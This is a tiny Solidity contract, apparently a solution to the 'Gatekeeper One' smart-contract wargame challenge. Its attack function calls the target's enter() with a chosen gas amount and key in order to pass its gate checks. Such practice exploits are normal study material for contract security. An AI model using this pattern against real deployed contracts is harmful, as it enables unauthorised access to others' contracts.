// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./gatekeeper_one.sol";

contract GatekeeperOneHacker {
    function attack(address gatekeeper, bytes8 key, uint gas) public returns (bool) {
        return GatekeeperOne(gatekeeper).enter{gas: gas}(key);
    }
}
